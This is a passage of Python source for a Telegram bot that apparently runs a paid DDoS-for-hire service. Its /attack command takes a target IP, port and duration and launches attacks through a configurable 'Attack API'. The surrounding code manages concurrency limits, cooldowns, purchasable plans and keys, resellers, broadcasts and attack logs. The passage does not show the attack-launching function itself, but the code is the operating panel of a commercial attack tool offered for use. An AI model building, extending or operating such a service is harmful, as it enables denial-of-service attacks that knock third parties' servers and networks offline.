                else:
                    bot.send_message(int(g["_id"]), f"📢 <b>Announcement:</b>\n\n{msg}", parse_mode="HTML")
                count += 1
                time.sleep(0.5)
            except:
                pass
        bot.reply_to(message, f"✅ Broadcast sent to {count} recipients (users + groups).")
    elif target == "private_users":
        users = plans_col.find({"expires": {"$gt": datetime.now().isoformat()}})
        for u in users:
            try:
                if photo:
                    bot.send_photo(int(u["_id"]), photo, caption=msg)
                else:
                    bot.send_message(int(u["_id"]), f"📢 <b>Broadcast:</b>\n\n{msg}", parse_mode="HTML")
                count += 1
                time.sleep(0.5)
            except:
                pass
        bot.reply_to(message, f"✅ Broadcast sent to {count} private users.")
    elif target == "resellers":
        for r in resellers_col.find():
            try:
                if photo:
                    bot.send_photo(int(r["_id"]), photo, caption=msg)
                else:
                    bot.send_message(int(r["_id"]), f"📢 <b>Broadcast for Resellers:</b>\n\n{msg}", parse_mode="HTML")
                count += 1
                time.sleep(0.5)
            except:
                pass
        bot.reply_to(message, f"✅ Broadcast sent to {count} resellers.")
    elif target == "authorized_groups":
        for g in groups_col.find():
            try:
                if photo:
                    bot.send_photo(int(g["_id"]), photo, caption=msg)
                else:
                    bot.send_message(int(g["_id"]), f"📢 <b>Broadcast:</b>\n\n{msg}", parse_mode="HTML")
                count += 1
                time.sleep(0.5)
            except:
                pass
        bot.reply_to(message, f"✅ Broadcast sent to {count} authorized groups.")
    else:
        bot.reply_to(message, "⚠️ Invalid target.")

# ------------------ Stats & Logs (admins can view many of these) ------------------
@bot.message_handler(commands=['stats'])
def stats_command(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    approved = groups_col.count_documents({})
    banned = bans_col.count_documents({})
    resellers = resellers_col.count_documents({})
    active_keys = keys_col.count_documents({"redeemed_by": None, "expires": {"$gt": datetime.now().isoformat()}})
    active_plans = plans_col.count_documents({
        "$or": [{"attacks_left": -1}, {"attacks_left": {"$gt": 0}}],
        "expires": {"$gt": datetime.now().isoformat()}
    })
    total_attacks = attack_logs_col.count_documents({})
    completed_attacks = attack_logs_col.count_documents({"status": "completed"})
    text = f"""📊 <b>Overall Statistics</b>

• Approved Groups: {approved}
• Banned Users: {banned}
• Resellers: {resellers}
• Active Keys: {active_keys}
• Active User Plans: {active_plans}
• Total Attacks Logged: {total_attacks}
• Completed Attacks: {completed_attacks}
• Global Max Time: {get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s
• Global Cooldown: {get_setting('cooldown', DEFAULT_COOLDOWN)}s
• Max Concurrent Attacks: {get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}"""
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['view_logs'])
def view_logs(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    n = 10
    if len(parts) == 2:
        try:
            n = int(parts[1])
        except:
            pass
    logs = list(attack_logs_col.find().sort("timestamp", -1).limit(n))
    if not logs:
        bot.reply_to(message, "📋 No attack logs.")
        return
    text = f"📋 <b>Last {len(logs)} Attack Logs:</b>\n\n"
    for log in reversed(logs):
        ts = datetime.fromisoformat(log["timestamp"]).strftime("%m-%d %H:%M")
        text += f"• {ts} | User {log['user_id']} | {log['target']}:{log['port']} | {log['duration']}s | {log['status']} | {log['chat_type']}\n"
    bot.reply_to(message, text[:4000], parse_mode="HTML")

@bot.message_handler(commands=['server_stats'])
def server_stats(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    uptime = str(timedelta(seconds=time.time() - psutil.boot_time())).split('.')[0]
    text = f"""🖥 <b>Server Stats</b>

• CPU: {cpu}%
• Memory: {mem.percent}% ({mem.used//(1024**2)} MB / {mem.total//(1024**2)} MB)
• Disk: {disk.percent}% ({disk.free//(1024**3)} GB free)
• Uptime: {uptime}
• Active Attacks: {get_active_attack_count()} / {get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}"""
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['view_code_logs'])
def view_code_logs(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    n = 10
    if len(parts) == 2:
        try:
            n = int(parts[1])
        except:
            pass
    logs = list(key_logs_col.find().sort("timestamp", -1).limit(n))
    if not logs:
        bot.reply_to(message, "📋 No key logs.")
        return
    text = f"📋 <b>Last {len(logs)} Key Events:</b>\n\n"
    for log in reversed(logs):
        ts = datetime.fromisoformat(log["timestamp"]).strftime("%m-%d %H:%M")
        text += f"• {ts} | {log['event']} | Code: {log['code']}"
        if log.get('created_by'):
            text += f" | By: {log['created_by']}"
        if log.get('redeemed_by'):
            text += f" | User: {log['redeemed_by']}"
        text += "\n"
    bot.reply_to(message, text[:4000], parse_mode="HTML")

@bot.message_handler(commands=['list_codes'])
def list_codes(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    codes = list(keys_col.find({"redeemed_by": None, "expires": {"$gt": datetime.now().isoformat()}}))
    if not codes:
        bot.reply_to(message, "📋 No active/unused codes.")
        return
    text = f"🔑 <b>Active Codes ({len(codes)}):</b>\n\n"
    for c in codes[:50]:
        expires = datetime.fromisoformat(c["expires"])
        text += f"• {c['_id']} – {c.get('type','unknown')} – Expires: {expires.strftime('%Y-%m-%d %H:%M')}\n"
    if len(codes) > 50:
        text += f"\n... and {len(codes)-50} more."
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['delete_code'])
def delete_code(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delete_code &lt;code&gt;", parse_mode="HTML")
        return
    code = parts[1].upper()
    result = keys_col.delete_one({"_id": code})
    if result.deleted_count:
        log_key_event("deleted (manual)", code, extra="Owner deleted code")
        bot.reply_to(message, f"✅ Code {code} deleted.", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Code not found.")

@bot.message_handler(commands=['block_code'])
def block_code(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_code &lt;code&gt;", parse_mode="HTML")
        return
    code = parts[1].upper()
    if blocked_codes_col.count_documents({"_id": code}) > 0:
        bot.reply_to(message, "⚠️ Code already blocked.")
        return
    blocked_codes_col.insert_one({"_id": code})
    log_key_event("blocked", code, extra="Owner blocked code")
    key = keys_col.find_one({"_id": code})
    if key and key.get("redeemed_by"):
        plans_col.delete_one({"_id": str(key["redeemed_by"])})
        log_key_event("plan revoked (code blocked)", code, redeemed_by=key["redeemed_by"])
    bot.reply_to(message, f"🚫 Code {code} blocked. Any associated access has been revoked.", parse_mode="HTML")

@bot.message_handler(commands=['key_state'])
def key_state_command(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /key_state &lt;code&gt;", parse_mode="HTML")
        return
    code = parts[1].upper()
    key = keys_col.find_one({"_id": code})
    if not key:
        bot.reply_to(message, "❌ Code not found.")
        return
    expires = datetime.fromisoformat(key["expires"])
    now = datetime.now()
    is_expired = now > expires
    is_redeemed = key.get("redeemed_by") is not None
    is_blocked = blocked_codes_col.count_documents({"_id": code}) > 0
    redeemer_info = "Not redeemed"
    if is_redeemed:
        try:
            user = bot.get_chat(key["redeemed_by"])
            redeemer_info = f"@{user.username}" if user.username else f"ID: {key['redeemed_by']}"
        except:
            redeemer_info = f"ID: {key['redeemed_by']}"
    reseller_info = "N/A"
    created_by = key.get("created_by")
    if created_by and is_reseller(created_by):
        try:
            reseller_chat = bot.get_chat(created_by)
            reseller_info = f"@{reseller_chat.username}" if reseller_chat.username else f"ID: {created_by}"
        except:
            reseller_info = f"ID: {created_by}"
    text = f"""🔍 <b>Key State:</b> {code}

• Type: {key.get('type', 'unknown')}
• Attacks: {'Unlimited' if key['attacks_left'] == -1 else key['attacks_left']}
• Max Duration: {key['max_duration']}s
• Cooldown: {key['cooldown']}s
• Created By: {key.get('created_by', 'Unknown')}
• Reseller: {reseller_info}
• Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')} {'(Expired)' if is_expired else '(Valid)'}
• Redeemed: {'Yes' if is_redeemed else 'No'}
• Redeemer: {redeemer_info}
• Redeemed At: {key.get('redeemed_at', 'N/A')}
• Blocked: {'Yes' if is_blocked else 'No'}
• Trial: {'Yes' if key.get('trial', False) else 'No'}
• Reset Count: {key.get('reset_count', 0)}/2"""
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['private_users'])
def private_users_command(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    plans = list(plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}))
    if not plans:
        bot.reply_to(message, "📋 No private users with active plans.")
        return
    text = "👥 <b>Private Users with Active Plans:</b>\n\n"
    for plan in plans:
        uid = plan["_id"]
        try:
            user = bot.get_chat(int(uid))
            username = f"@{user.username}" if user.username else "No username"
            name = html.escape(user.first_name or "")
        except:
            username = "Unknown"
            name = ""
        code = plan.get("redeemed_code", "Unknown")
        key_info = ""
        key = keys_col.find_one({"_id": code})
        if key:
            key_info = f" | Key: {key.get('type','?')} by {key.get('created_by','?')}"
        expires = datetime.fromisoformat(plan["expires"])
        remaining = expires - datetime.now()
        days = remaining.days
        hours = remaining.seconds // 3600
        text += f"• {uid} | {username} | {name}\n  Code: {code}{key_info}\n  ⏳ {days}d {hours}h left\n\n"
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Settings (owner only) ------------------
@bot.message_handler(commands=['settime'])
def set_max_time(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /settime &lt;seconds&gt;", parse_mode="HTML")
        return
    try:
        t = int(parts[1])
        if t < 10 or t > 600:
            bot.reply_to(message, "❌ Time must be between 10 and 600 seconds!")
            return
        update_setting("max_attack_time", t)
        plans_col.update_many({}, {"$set": {"max_duration": t}})
        bot.reply_to(message, f"✅ Global max attack time set to {t}s. All existing user plans updated.")
    except:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /setcooldown &lt;seconds&gt;", parse_mode="HTML")
        return
    try:
        c = int(parts[1])
        if c < 0 or c > 600:
            bot.reply_to(message, "❌ Cooldown must be between 0 and 600 seconds!")
            return
        update_setting("cooldown", c)
        plans_col.update_many({}, {"$set": {"cooldown": c}})
        bot.reply_to(message, f"✅ Global cooldown set to {c}s. All existing user plans updated.")
    except:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=['setconcurrent'])
def set_concurrent(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /setconcurrent &lt;number&gt;", parse_mode="HTML")
        return
    try:
        num = int(parts[1])
        if num < 1 or num > 50:
            bot.reply_to(message, "❌ Number must be between 1 and 50.")
            return
        update_setting("max_concurrent_attacks", num)
        bot.reply_to(message, f"✅ Global max concurrent attacks set to {num}.")
    except:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=['setapi'])
def set_api(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ Usage: /setapi &lt;url&gt; &lt;api_key&gt;", parse_mode="HTML")
        return
    url = parts[1]
    key = ' '.join(parts[2:])
    update_setting("api_url", url)
    update_setting("api_key", key)
    bot.reply_to(message, f"✅ Attack API configured:\nURL: {url}\nKey: {key[:6]}...{key[-4:]}", parse_mode="HTML")

@bot.message_handler(commands=['port_protection'])
def toggle_port_protection(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on', 'off']:
        bot.reply_to(message, "⚠️ Usage: /port_protection on/off", parse_mode="HTML")
        return
    state = parts[1].lower() == 'on'
    update_setting("port_protection", state)
    status = "ON ✅" if state else "OFF ❌"
    bot.reply_to(message, f"🛡️ Port Protection: {status}")

@bot.message_handler(commands=['feedback'])
def toggle_feedback(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on','off']:
        bot.reply_to(message, "⚠️ Usage: /feedback on/off", parse_mode="HTML")
        return
    state = parts[1].lower() == 'on'
    update_setting("feedback_system", state)
    status = "ON ✅" if state else "OFF ❌"
    bot.reply_to(message, f"📸 Feedback System: {status}")

@bot.message_handler(commands=['block_port'])
def block_port(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /block_port &lt;ip&gt; &lt;port&gt;", parse_mode="HTML")
        return
    ip = parts[1]
    port = parts[2]
    if not validate_target(ip):
        bot.reply_to(message, "❌ Invalid IP!")
        return
    try:
        p = int(port)
        if p < 1 or p > 65535:
            bot.reply_to(message, "❌ Invalid port!")
            return
    except:
        bot.reply_to(message, "❌ Invalid port!")
        return
    key = f"{ip}:{port}"
    settings_col.update_one({"_id": "blocked_ports"}, {"$set": {key: datetime.now().strftime('%d-%m-%Y %H:%M:%S')}}, upsert=True)
    bot.reply_to(message, f"🚫 <b>Port Blocked!</b>\n\n🎯 {key}\n⏳ For 2 hours", parse_mode="HTML")

@bot.message_handler(commands=['unblock_port'])
def unblock_port(message):
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /unblock_port &lt;ip&gt; &lt;port&gt;", parse_mode="HTML")
        return
    key = f"{parts[1]}:{parts[2]}"
    settings_col.update_one({"_id": "blocked_ports"}, {"$unset": {key: ""}})
    bot.reply_to(message, f"✅ Port Unblocked: {key}", parse_mode="HTML")

@bot.message_handler(commands=['blocked_ports'])
def list_blocked_ports(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    blocked = settings_col.find_one({"_id": "blocked_ports"})
    if not blocked:
        bot.reply_to(message, "📋 No blocked ports!")
        return
    blocked.pop("_id", None)
    if not blocked:
        bot.reply_to(message, "📋 No blocked ports!")
        return
    now = datetime.now()
    text = "🚫 <b>Blocked Ports:</b>\n\n"
    for i, (key, t) in enumerate(blocked.items(), 1):
        block_time = datetime.strptime(t, '%d-%m-%Y %H:%M:%S')
        elapsed = (now - block_time).total_seconds()
        remaining = max(0, PORT_BLOCK_DURATION - elapsed)
        mins = int(remaining // 60)
        text += f"{i}. {key} – {mins} min remaining\n"
    bot.reply_to(message, text, parse_mode="HTML")

# ------------------ Attack Command ------------------
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not check_access(message):
        return

    user_id = message.from_user.id

    max_concurrent_user, max_duration, cooldown_seconds = get_user_limits(user_id)
    if is_group(message):
        group_max_concurrent, group_max_time, group_cooldown = get_group_limits(message.chat.id)
        if not is_owner(user_id):
            max_concurrent_user = min(max_concurrent_user, group_max_concurrent)
            max_duration = min(max_duration, group_max_time)
            cooldown_seconds = max(cooldown_seconds, group_cooldown)

            total_active_in_group = get_group_active_attacks_count(message.chat.id)
            if total_active_in_group >= group_max_concurrent:
                bot.reply_to(message, f"❌ Group attack limit reached! Only {group_max_concurrent} attack can run simultaneously in this group. Wait for it to finish.")
                return

            active_in_group = get_user_active_attacks_in_group(user_id, message.chat.id)
            if active_in_group >= max_concurrent_user:
                bot.reply_to(message, f"❌ You already have {active_in_group} active attack(s) in this group. Max concurrent: {max_concurrent_user}")
                return

    if not is_owner(user_id):
        remaining_cd = get_user_cooldown(user_id)
        if remaining_cd > 0:
            bot.reply_to(message, f"⏳ Cooldown active! Please wait {remaining_cd}s")
            return

    if not is_owner(user_id) and user_has_active_attack(user_id):
        bot.reply_to(message, "❌ You already have an active attack! Wait for it to finish.")
        return

    active_count = get_active_attack_count()
    max_concurrent_global = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
    if active_count >= max_concurrent_global:
        bot.reply_to(message, f"❌ All attack slots busy! ({active_count}/{max_concurrent_global})\n\nCheck /status.", parse_mode="HTML")
        return

    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;", parse_mode="HTML")
        return

    target, port, duration = parts[1], parts[2], parts[3]

    if not validate_target(target):
        bot.reply_to(message, "❌ Invalid IP!")
        return

    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port! (1-65535)")
            return
        duration = int(duration)
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be numbers!")
        return

    blocked, remaining = is_port_blocked(target, port)
    if blocked:
        mins = remaining // 60
        bot.reply_to(message, f"🚫 This IP:Port is blocked!\n\n🎯 {target}:{port}\n⏳ {mins} min remaining", parse_mode="HTML")
        return

    if get_setting("port_protection", False) and not is_owner(user_id):
        protected, p_remaining = check_port_protection(user_id, target, port)
        if protected:
            mins = p_remaining // 60
            bot.reply_to(message, f"🛡️ Port Protection Active!\n\n🎯 {target}:{port}\n⏳ You can attack same IP:Port after 2 hours\n⏳ {mins} min remaining", parse_mode="HTML")
            return

    if not is_owner(user_id) and duration > max_duration:
        bot.reply_to(message, f"❌ Max attack time for you: {max_duration}s")
        return

    if not is_owner(user_id) and not is_group(message):
        plan = plans_col.find_one({"_id": str(user_id)})
        if plan and plan["attacks_left"] != -1:
            if plan["attacks_left"] <= 0:
                bot.reply_to(message, "❌ You have no attacks left in your plan.")
                return
            plans_col.update_one({"_id": str(user_id)}, {"$inc": {"attacks_left": -1}})
            if plan["attacks_left"] == 1:
                bot.reply_to(message, "⚠️ This was your last attack. Your plan is now exhausted.")

    attack_id = f"{user_id}_{datetime.now().timestamp()}"

    with _attack_lock:
        active_attacks[attack_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'user_id': user_id,
            'start_time': datetime.now(),
            'end_time': datetime.now() + timedelta(seconds=duration),
            'chat_type': message.chat.type,
            'chat_id': message.chat.id if is_group(message) else None
        }

    thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, cooldown_seconds))
    thread.start()

# ------------------ Live Status (auto-refresh every 5s, runs for 2 min) ------------------
def generate_status_text(user_id=None):
    active_count = get_active_attack_count()
    max_global = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
    max_time_setting = get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)

    text = f"⚡ <b>Active Attacks:</b> {active_count}/{max_global}\n"

    if active_count == 0:
        text += "\nNo active attacks."
    else:
        with _attack_lock:
            now = datetime.now()
            for aid, atk in list(active_attacks.items()):
                if atk['end_time'] > now:
                    remaining = int((atk['end_time'] - now).total_seconds())
                    total_duration = atk['duration']
                    elapsed = total_duration - remaining
                    progress = int((elapsed / total_duration) * 20) if total_duration > 0 else 20
                    bar = "█" * progress + "▒" * (20 - progress)
                    percent = int((elapsed / total_duration) * 100) if total_duration > 0 else 100
                    chat_type_display = "Private" if atk.get('chat_type') == 'private' else "Group"
                    text += f"\n- {atk['target']}:{atk['port']} ({remaining}s) by {atk['user_id']} {chat_type_display}\n  {bar} {percent}%"

    text += f"""

⚙️ <b>Settings:</b>
Concurrent = {max_global}
Max Time = {max_time_setting}s"""

    if user_id and not is_owner(user_id):
        cd = get_user_cooldown(user_id)
        if cd > 0:
            text += f"\n\n⏳ <b>Your Cooldown:</b> {cd}s remaining"
        else:
            text += "\n\n⏳ <b>Your Cooldown:</b> Ready"
    return text

def live_status_updater(chat_id, message_id, stop_event, user_id):
    last_text = ""
    start_time = datetime.now()
    while not stop_event.is_set():
        if (datetime.now() - start_time).total_seconds() > 120:
            break
        current_text = generate_status_text(user_id)
        if current_text != last_text:
            try:
                bot.edit_message_text(current_text, chat_id=chat_id, message_id=message_id, parse_mode="HTML")
                last_text = current_text
            except:
                pass
        time.sleep(5)
    try:
        final_text = generate_status_text(user_id)
        bot.edit_message_text(final_text, chat_id=chat_id, message_id=message_id, parse_mode="HTML")
    except:
        pass

@bot.message_handler(commands=['status'])
def status_command(message):
    if not check_access(message):
        return
    user_id = message.from_user.id
    chat_id = message.chat.id
    if chat_id in live_status_trackers:
        live_status_trackers[chat_id].set()
    initial_text = generate_status_text(user_id)
    sent = bot.reply_to(message, initial_text, parse_mode="HTML")
    stop_event = threading.Event()
    live_status_trackers[chat_id] = stop_event
    thread = threading.Thread(target=live_status_updater, args=(chat_id, sent.message_id, stop_event, user_id))
    thread.daemon = True
    thread.start()

# Catch-all
@bot.message_handler(func=lambda m: True)
def handle_unknown(message):
    if message.text and message.text.startswith('/'):
        cmd = message.text.split()[0].lower()
        known = ['start', 'owner', 'state', 'approve', 'disapprove', 'approved_groups', 'ban', 'unban', 'banned_list',
                 'add_reseller', 'remove_reseller', 'resellers', 'addcredit', 'removecredit', 'reseller_credits',
                 'genkey', 'gentrial', 'gentrialfor', 'deletetrials', 'deletealltrials', 'gen', 'redeem', 'broadcast',
                 'settime', 'setcooldown', 'setconcurrent', 'setapi', 'port_protection', 'feedback', 'block_port', 'unblock_port',
                 'blocked_ports', 'attack', 'status', 'help', 'ping', 'id', 'group_info', 'check_my_access',
                 'reseller_panel', 'mycredit', 'stats', 'view_logs', 'server_stats', 'view_code_logs',
                 'list_codes', 'delete_code', 'block_code', 'key_state', 'maintenance', 'export_data',
                 'extend_all_users', 'deduct_all', 'deduct_time', 'deletelogs_attack', 'deletelogs_key', 'deletelogs_all',
                 'reseller_info', 'private_users', 'keyreset', 'keyblock', 'report',
                 'addadmin', 'removeadmin', 'admins', 'adminlogs']
        if cmd[1:] not in known:
            bot.reply_to(message, f"❌ Unknown command: {cmd}\n\nUse /help to see available commands.", parse_mode="HTML")
    else:
        if get_setting("feedback_system", False) and not is_group(message) and message.content_type == 'photo':
            try:
                bot.forward_message(BOT_OWNER, message.chat.id, message.message_id)
                bot.reply_to(message, "📸 Feedback sent to owner. Thank you!")
            except:
                pass

print("Bot starting...")
print(f"API URL: {get_setting('api_url', DEFAULT_API_URL)}")
print(f"API Key: {get_setting('api_key', DEFAULT_API_KEY)[:10]}...")
while True:
    try:
        bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Polling error: {e}")
        time.sleep(5)
